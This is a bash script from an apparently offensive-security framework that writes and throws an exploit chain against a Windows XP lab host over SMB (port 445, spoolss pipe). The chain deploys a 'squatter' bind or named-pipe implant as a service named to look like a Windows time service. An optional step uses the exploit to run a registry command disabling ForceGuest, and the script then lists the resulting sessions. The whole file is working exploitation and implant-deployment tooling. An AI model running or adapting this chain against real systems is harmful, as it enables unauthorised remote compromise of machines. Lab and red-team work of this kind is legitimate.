#!/usr/bin/env bash
set -euo pipefail

root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
workspace="${HOVEL_WORKSPACE:-"$root/.hovel"}"
module_config="${HOVEL_MODULE_CONFIG:-"$root/examples/hovel-modules.json"}"
squatter_payload="${SQUATTER_PAYLOAD_PATH:-"$root/examples/bin/squatter.exe"}"
target_host="${HOVEL_LAB_TARGET_HOST:-192.168.122.142}"
target_id="${HOVEL_LAB_TARGET_ID:-xp-lab}"
transport="${HOVEL_SQUATTER_TYPE:-tcp-bind}"
bind_port="${HOVEL_SQUATTER_BIND_PORT:-9101}"
pipe_name="${HOVEL_SQUATTER_PIPE:-squatter}"
pipe_path="\\\\.\\pipe\\${pipe_name}"
remote_path="${HOVEL_SQUATTER_REMOTE_PATH:-}"
smb_user="${HOVEL_SMB_USER:-user}"
smb_password="${HOVEL_SMB_PASSWORD:-password}"
smb_domain="${HOVEL_SMB_DOMAIN:-}"
forceguest="${HOVEL_FORCEGUEST_FIX:-auto}"
chain_file="$workspace/lab/etro-squatter-${transport}.chain.yaml"
forceguest_chain="$workspace/lab/etro-forceguest.chain.yaml"

mkdir -p "$(dirname "$chain_file")"

remote_chain_config=""
remote_target_config=""
if [[ -n "$remote_path" ]]; then
  remote_chain_config="    squatter.remote_path: '$remote_path'"
  remote_target_config="        payload.remote_path: '$remote_path'"
fi

generate_named_pipe_payload() {
  local out="$workspace/lab/squatter-${pipe_name}.exe"
  HOVEL_MODULE_CONFIG="$module_config" task run -- //payloads/squatter/provider:squatter-generate -- \
    --transport smb-named-pipe --pipe "\\\\.\\pipe\\${pipe_name}" --out "$out" >/dev/null
  squatter_payload="$out"
}

admin_probe_ok() {
  HOVEL_MODULE_CONFIG="$module_config" task run -- //payloads/squatter/client/cmd/smbadminctl -- \
    --user "$smb_user" --password "$smb_password" --domain "$smb_domain" --read 'C:\Windows\win.ini' "$target_host" >/dev/null
}

write_forceguest_chain() {
  cat >"$forceguest_chain" <<EOF
apiVersion: hovel.dev/v1alpha1
kind: Chain
metadata:
  name: etro-forceguest
spec:
  mode: configured
  steps:
    - id: forceguest
      uses: module:etro-exploit@v1.0.0
  config:
    operator.confirmed_lab: "true"
  targets:
    - id: "$target_id"
      config:
        target.host: "$target_host"
        target.port: "445"
        pipe: "spoolss"
        command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v ForceGuest /t REG_DWORD /d 0 /f'
        cleanup: "true"
        target_profile: "XP_SP2SP3_X86"
        timeout_seconds: "20"
EOF
}

maybe_disable_forceguest() {
  case "$forceguest" in
    0|false|no|off) return 0 ;;
  esac
  if admin_probe_ok; then
    echo "SMB admin probe succeeded; ForceGuest remediation not needed"
    return 0
  fi
  echo "SMB admin probe failed; throwing Etro ForceGuest remediation"
  write_forceguest_chain
  HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$forceguest_chain" --allow-dangerous --now
  sleep 3
}

if [[ "$transport" == "smb-named-pipe" ]]; then
  generate_named_pipe_payload
  maybe_disable_forceguest
fi

cat >"$chain_file" <<EOF
apiVersion: hovel.dev/v1alpha1
kind: Chain
metadata:
  name: etro-squatter-${transport}
spec:
  mode: configured
  steps:
    - id: exploit
      uses: module:etro-exploit@v1.0.0
    - id: squatter
      uses: module:squatter@v0.1.0
  config:
    operator.confirmed_lab: "true"
    squatter.type: "$transport"
    squatter.bind_port: "$bind_port"
$remote_chain_config
  targets:
    - id: "$target_id"
      config:
        target.host: "$target_host"
        target.port: "445"
        pipe: "spoolss"
        payload.transport: "$transport"
        payload.local_path: "$squatter_payload"
$remote_target_config
        payload.bind_port: "$bind_port"
        payload.pipe: '$pipe_path'
        smb.username: "$smb_user"
        smb.password: "$smb_password"
        smb.domain: "$smb_domain"
        smb.port: "445"
        service.name: "w32tm33"
        cleanup: "true"
        target_profile: "XP_SP2SP3_X86"
        timeout_seconds: "20"
EOF

echo "Wrote $chain_file"
if [[ "$transport" == "smb-named-pipe" ]]; then
  echo "Throwing Etro -> Squatter SMB named pipe at $target_host (${pipe_name})"
else
  echo "Throwing Etro -> Squatter TCP bind at $target_host:$bind_port"
fi
SQUATTER_PAYLOAD_PATH="$squatter_payload" HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$chain_file" --allow-dangerous --now
echo
echo "Active sessions:"
HOVEL_MODULE_CONFIG="$module_config" task run -- //cmd/hovel -- session list --workspace "$workspace"
